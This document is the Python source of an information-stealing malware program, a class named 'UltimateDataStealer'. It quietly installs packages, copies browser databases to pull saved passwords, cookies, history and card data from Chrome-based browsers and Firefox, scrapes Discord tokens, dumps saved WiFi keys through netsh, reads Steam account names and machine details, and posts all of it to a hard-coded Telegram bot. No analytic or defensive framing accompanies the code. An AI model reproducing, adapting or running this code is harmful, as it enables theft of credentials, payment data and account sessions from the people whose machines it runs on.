import os
import json
import sqlite3
import shutil
import base64
import tempfile
import platform
import subprocess
import sys
from datetime import datetime
import threading
import time
import glob
import re


# Install required packages automatically
def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
        return True
    except:
        return False


# Install all required packages
required_packages = ["requests", "pycryptodome", "psutil"]
for package in required_packages:
    try:
        if package == "requests":
            import requests
        elif package == "pycryptodome":
            from Crypto.Cipher import AES
        elif package == "psutil":
            import psutil
    except ImportError:
        install_package(package)

# Import after installation
import requests
from Crypto.Cipher import AES
import psutil

TELEGRAM_BOT_TOKEN = "8364490036:AAFNksk0KNOMq6tNtwOHKX83M6-Mi2ZB7hg"
CHAT_ID = "916113275"


class UltimateDataStealer:
    def __init__(self):
        self.collected_data = []
        self.temp_dir = tempfile.gettempdir()
        self.system_info = ""

    def get_all_browser_paths(self):
        browsers = {}
        if platform.system() == "Windows":
            browsers = {
                "Chrome": [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Google", "Chrome", "User Data"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "Google", "Chrome", "Application"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Google", "Chrome", "Application")
                ],
                "Edge": [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Edge", "User Data"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "Microsoft", "Edge", "Application"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Microsoft", "Edge", "Application")
                ],
                "Firefox": [
                    os.path.join(os.environ.get('APPDATA', ''), "Mozilla", "Firefox"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "Mozilla Firefox"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Mozilla Firefox")
                ],
                "Opera": [
                    os.path.join(os.environ.get('APPDATA', ''), "Opera Software", "Opera Stable"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "Opera"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Opera")
                ],
                "Opera GX": [
                    os.path.join(os.environ.get('APPDATA', ''), "Opera Software", "Opera GX Stable"),
                ],
                "Brave": [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "BraveSoftware", "Brave-Browser", "User Data"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "BraveSoftware", "Brave-Browser", "Application"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "BraveSoftware", "Brave-Browser",
                                 "Application")
                ],
                "Yandex": [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Yandex", "YandexBrowser", "User Data"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "Yandex", "YandexBrowser"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Yandex", "YandexBrowser")
                ],
                "Vivaldi": [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Vivaldi", "User Data"),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), "Vivaldi", "Application"),
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Vivaldi", "Application")
                ]
            }
        return browsers

    def extract_chrome_based_data(self, browser_path, browser_name):
        try:
            if not os.path.exists(browser_path):
                return

            profiles = []
            for item in os.listdir(browser_path):
                full_path = os.path.join(browser_path, item)
                if os.path.isdir(full_path) and (
                        item.startswith("Profile") or item == "Default" or item == "Guest Profile"):
                    profiles.append(full_path)

            if not profiles and os.path.exists(os.path.join(browser_path, "Default")):
                profiles = [os.path.join(browser_path, "Default")]

            for profile in profiles:
                self.extract_login_data(profile, browser_name)
                self.extract_cookie_data(profile, browser_name)
                self.extract_history_data(profile, browser_name)
                self.extract_credit_cards(profile, browser_name)

        except Exception as e:
            self.collected_data.append(f"❌ {browser_name} error: {str(e)}")

    def extract_login_data(self, profile_path, browser_name):
        try:
            login_data_file = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_file):
                temp_db = os.path.join(self.temp_dir, "temp_login.db")
                shutil.copy2(login_data_file, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url = row[0] if row[0] else "No URL"
                        username = row[1] if row[1] else "No Username"
                        password = self.simple_decrypt(row[2]) if row[2] else "No Password"

                        if username != "No Username" or password != "No Password":
                            self.collected_data.append(f"🔐 {browser_name} - {url} | {username} | {password}")
                except sqlite3.Error as e:
                    pass

                cursor.close()
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass

        except Exception as e:
            pass

    def extract_cookie_data(self, profile_path, browser_name):
        try:
            cookie_path = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(cookie_path):
                temp_db = os.path.join(self.temp_dir, "temp_cookies.db")
                shutil.copy2(cookie_path, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
                    for row in cursor.fetchall():
                        host = row[0] if row[0] else "No Host"
                        name = row[1] if row[1] else "No Name"
                        value = row[2] if row[2] else "No Value"
                        self.collected_data.append(f"🍪 {browser_name} - {host} | {name} = {value}")
                except sqlite3.Error:
                    pass

                cursor.close()
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass

        except Exception as e:
            pass

    def extract_history_data(self, profile_path, browser_name):
        try:
            history_path = os.path.join(profile_path, "History")
            if os.path.exists(history_path):
                temp_db = os.path.join(self.temp_dir, "temp_history.db")
                shutil.copy2(history_path, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    for row in cursor.fetchall():
                        url = row[0] if row[0] else "No URL"
                        title = row[1] if row[1] else "No Title"
                        self.collected_data.append(f"📜 {browser_name} History - {title} | {url}")
                except sqlite3.Error:
                    pass

                cursor.close()
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass

        except Exception as e:
            pass

    def extract_credit_cards(self, profile_path, browser_name):
        try:
            cards_path = os.path.join(profile_path, "Web Data")
            if os.path.exists(cards_path):
                temp_db = os.path.join(self.temp_dir, "temp_cards.db")
                shutil.copy2(cards_path, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                try:
                    cursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cursor.fetchall():
                        name = row[0] if row[0] else "No Name"
                        month = row[1] if row[1] else "XX"
                        year = row[2] if row[2] else "XXXX"
                        card = self.simple_decrypt(row[3]) if row[3] else "Encrypted"
                        self.collected_data.append(f"💳 {browser_name} Card - {name} | {month}/{year} | {card}")
                except sqlite3.Error:
                    pass

                cursor.close()
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass

        except Exception as e:
            pass

    def simple_decrypt(self, encrypted_data):
        try:
            if isinstance(encrypted_data, bytes):
                return encrypted_data.decode('utf-8', errors='ignore')
            else:
                return str(encrypted_data)
        except:
            return "[Encrypted Data]"

    def extract_firefox_data(self):
        try:
            firefox_path = os.path.join(os.environ.get('APPDATA', ''), "Mozilla", "Firefox", "Profiles")
            if not os.path.exists(firefox_path):
                return

            profiles = []
            for item in os.listdir(firefox_path):
                if item.endswith('.default-release') or item.endswith('.default'):
                    profiles.append(os.path.join(firefox_path, item))

            for profile in profiles:
                # Logins
                logins_json = os.path.join(profile, "logins.json")
                if os.path.exists(logins_json):
                    try:
                        with open(logins_json, "r", encoding="utf-8") as f:
                            data = f.read()
                            if "logins" in data:
                                logins_data = json.loads(data)
                                for login in logins_data.get("logins", []):
                                    url = login.get("hostname", "No URL")
                                    username = login.get("username", "No User")
                                    password = login.get("password", "No Pass")
                                    self.collected_data.append(f"🔐 Firefox - {url} | {username} | {password}")
                    except:
                        pass

                # Cookies
                cookies_db = os.path.join(profile, "cookies.sqlite")
                if os.path.exists(cookies_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, "firefox_cookies.db")
                        shutil.copy2(cookies_db, temp_db)

                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 50")

                        for row in cursor.fetchall():
                            host = row[0] if row[0] else "No Host"
                            name = row[1] if row[1] else "No Name"
                            value = row[2] if row[2] else "No Value"
                            self.collected_data.append(f"🍪 Firefox Cookie - {host} | {name} = {value}")

                        cursor.close()
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass

        except Exception as e:
            self.collected_data.append(f"❌ Firefox error: {str(e)}")

    def extract_discord_tokens(self):
        try:
            discord_paths = [
                os.path.join(os.environ.get('APPDATA', ''), "discord"),
                os.path.join(os.environ.get('APPDATA', ''), "discordcanary"),
                os.path.join(os.environ.get('APPDATA', ''), "discordptb"),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), "Discord"),
            ]

            for discord_path in discord_paths:
                if not os.path.exists(discord_path):
                    continue

                # Search in Local Storage
                storage_path = os.path.join(discord_path, "Local Storage", "leveldb")
                if os.path.exists(storage_path):
                    for file in os.listdir(storage_path):
                        if file.endswith('.ldb') or file.endswith('.log'):
                            file_path = os.path.join(storage_path, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Improved token regex
                                    tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                                    for token in tokens:
                                        self.collected_data.append(f"🎮 DISCORD TOKEN: {token}")
                            except:
                                pass

                # Search in all JSON files
                for root, dirs, files in os.walk(discord_path):
                    for file in files:
                        if file.endswith('.json'):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8') as f:
                                    content = f.read()
                                    if "token" in content.lower():
                                        tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                                        for token in tokens:
                                            self.collected_data.append(f"🎮 Discord JSON Token: {token}")
                            except:
                                pass

        except Exception as e:
            self.collected_data.append(f"❌ Discord error: {str(e)}")

    def extract_system_info(self):
        try:
            info_lines = []
            info_lines.append("🖥️ SYSTEM INFORMATION:")
            info_lines.append(f"Computer: {platform.node()}")
            info_lines.append(f"OS: {platform.system()} {platform.release()}")
            info_lines.append(f"Version: {platform.version()}")
            info_lines.append(f"Architecture: {platform.architecture()[0]}")
            info_lines.append(f"Processor: {platform.processor()}")
            info_lines.append(f"User: {os.getlogin()}")
            info_lines.append(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

            # Network info
            try:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == 2:  # IPv4
                            info_lines.append(f"Network {interface}: {addr.address}")
            except:
                pass

            # Disk info
            try:
                for partition in psutil.disk_partitions():
                    if 'cdrom' not in partition.opts:
                        usage = psutil.disk_usage(partition.mountpoint)
                        info_lines.append(
                            f"Disk {partition.device}: {usage.used // (1024 ** 3)}GB/{usage.total // (1024 ** 3)}GB used")
            except:
                pass

            self.system_info = "\n".join(info_lines)

        except Exception as e:
            self.system_info = f"System info error: {str(e)}"

    def extract_wifi_passwords(self):
        try:
            if platform.system() == "Windows":
                # Extract WiFi passwords using netsh
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8',
                                                 errors='ignore')
                profiles = re.findall(r'All User Profile\s*:\s*(.*)', result)

                for profile in profiles:
                    try:
                        profile = profile.strip()
                        result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                                         encoding='utf-8', errors='ignore')
                        password_match = re.search(r'Key Content\s*:\s*(.*)', result)
                        if password_match:
                            password = password_match.group(1).strip()
                            self.collected_data.append(f"📡 WiFi - {profile} : {password}")
                    except:
                        continue
        except:
            pass

    def extract_steam_data(self):
        try:
            steam_path = os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Steam")
            if os.path.exists(steam_path):
                # Extract Steam config
                config_path = os.path.join(steam_path, "config", "loginusers.vdf")
                if os.path.exists(config_path):
                    try:
                        with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for account names
                            accounts = re.findall(r'AccountName\"\s*\"([^\"]+)', content)
                            for account in accounts:
                                self.collected_data.append(f"🎮 Steam Account: {account}")
                    except:
                        pass
        except:
            pass

    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": CHAT_ID,
                "text": message
            }
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
        except:
            return False

    def send_all_data(self):
        # Send system info first
        if self.system_info:
            self.send_to_telegram(self.system_info)
            time.sleep(1)

        # Send collected data in chunks
        if self.collected_data:
            current_chunk = "📱 EXTRACTED DATA:\n\n"

            for item in self.collected_data:
                if len(current_chunk + item + "\n") > 4000:
                    self.send_to_telegram(current_chunk)
                    current_chunk = "📱 CONTINUED:\n\n"
                    time.sleep(1)

                current_chunk += item + "\n"

            if len(current_chunk) > 20:
                self.send_to_telegram(current_chunk)

        # Send completion message
        self.send_to_telegram(f"✅ Extraction complete! Collected {len(self.collected_data)} items.")

    def run_extraction(self):
        self.collected_data.append("🚀 STARTING ULTIMATE DATA EXTRACTION...")

        # Get system information
        self.extract_system_info()

        # Extract from all browsers
        browsers = self.get_all_browser_paths()
        for browser_name, paths in browsers.items():
            for path in paths:
                if os.path.exists(path):
                    self.extract_chrome_based_data(path, browser_name)

        # Firefox
        self.extract_firefox_data()

        # Discord tokens
        self.extract_discord_tokens()

        # WiFi passwords
        self.extract_wifi_passwords()

        # Steam data
        self.extract_steam_data()

        # Send all data
        self.send_all_data()


def main():
    stealer = UltimateDataStealer()
    stealer.run_extraction()


if __name__ == "__main__":
    main()